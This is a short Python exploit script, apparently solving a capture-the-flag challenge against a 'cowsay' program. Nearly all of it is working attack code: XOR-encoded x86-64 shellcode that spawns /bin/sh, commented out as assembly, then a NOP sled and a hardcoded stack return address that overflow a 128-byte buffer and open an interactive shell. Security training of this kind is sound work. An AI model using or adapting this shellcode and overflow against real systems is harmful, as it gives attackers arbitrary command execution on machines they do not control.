import interact
import struct

# Add 1 to 3b and xor /bin/sh with 0x1010101010101010

# xor esi, esi
# push rsi
# movabs rbx, 0x78633f3f7e79723f
# movabs rcx, 0x1010101010101010
# xor rbx, rcx
# push rbx
# push rsp
# pop rdi
# mov al, 0x3a
# add rax, 1
# xor edx, edx
# syscall

payload = "\x31\xF6\x56\x48\xBB\x3F\x72\x79\x7E\x3F\x3F\x63\x78\x48\xB9\x10\x10\x10\x10\x10\x10\x10\x10\x48\x31\xCB\x53\x54\x5F\xB0\x3A\x48\x83\xC0\x01\x31\xD2\x0F\x05"
padding = "mo00oooo00o0o... "
addr = "\x61\xed\xff\xff\xff\x7f\x00\x00"

p = interact.Process()
data = p.readuntil('Enter a string to cowsay:')
p.sendline(payload + '\x90'*(128 - len(padding) - len(payload) + 8) + addr)

p.interactive()